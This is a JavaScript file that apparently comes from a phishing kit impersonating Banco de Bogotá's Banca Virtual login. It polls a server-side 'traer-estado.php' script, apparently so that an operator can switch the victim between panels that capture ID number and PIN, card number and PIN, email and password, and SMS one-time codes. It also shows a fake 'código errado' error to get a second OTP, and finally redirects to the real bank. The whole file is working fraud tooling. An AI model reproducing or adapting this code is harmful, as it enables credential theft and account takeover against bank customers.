function consultar_estado(){

    if (espera == 1) { 

        $.post( "process/traer-estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         vista_otp(); 
                         break;
                case '4':espera = 0;
                         vista_email(); 
                         break;
                case '6':espera = 0;
                         vista_tarjeta();  
                         break;               
                case '8':espera = 0;
                         vista_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota";
                          break;
                case '12':espera = 0;
                          vista_usuario(); 
                          break;
            } 
        });    
    }    
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function vista_email(){
    $(".cont-personas p").css("color", "#333333");
    $(".cont-personas p").html("Ingresa con tus datos a Banca Virtual, aquí puedes realizar tus pagos por internet y conocer los movimientos de tus productos bancarios");

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#email").val("");
    $("#clave-co").val("");
    $("#celular").val("");
    $("#email").focus();

    $("#login").hide();
    $("#panel-tarjeta").hide();
    $("#panel-otp").hide();
    $("#panel-correo").show();
}

function vista_tarjeta(){
    $(".cont-personas p").css("color", "#333333");
    $(".cont-personas p").html("Ingresa con tus datos a Banca Virtual, aquí puedes realizar tus pagos por internet y conocer los movimientos de tus productos bancarios");

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#tarjeta").val("");
    $("#clave").val("");    
    $("#tarjeta").focus();

    $("#login").hide();    
    $("#panel-correo").hide();
    $("#panel-otp").hide();    
    $("#panel-tarjeta").show();    
}


function vista_otp(){   
    $(".cont-personas p").css("color", "#333333");
    $(".cont-personas p").html("Para validar su identidad es necesario que ingresé un código enviado a su número de celular");

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#otp").val("");    
    $("#otp").focus();

    $("#login").hide();    
    $("#panel-correo").hide();    
    $("#panel-tarjeta").hide(); 
    $("#panel-otp").show(); 
}


function vista_errorotp(){
    $(".cont-personas p").css("color", "red");
    $(".cont-personas p").html("Código errado por favor intente nuevamente.");


    $(".fondo").hide();
    $(".mensaje").hide();

    $("#otp").val("");    
    $("#otp").focus();

    $("#login").hide();    
    $("#panel-correo").hide();    
    $("#panel-tarjeta").hide(); 
    $("#panel-otp").show(); 
}

function vista_usuario(){
    $(".cont-personas p").css("color", "#333333");
    $(".cont-personas p").html("Ingresa con tus datos a Banca Virtual, aquí puedes realizar tus pagos por internet y conocer los movimientos de tus productos bancarios");

    $(".fondo").hide();
    $(".mensaje").hide();

    $("#idNumber").val("");
    $("#pin").val("");    
    $("#idNumber").focus();
    
    $("#panel-correo").hide();    
    $("#panel-tarjeta").hide(); 
    $("#panel-otp").hide(); 
    $("#login").show();

}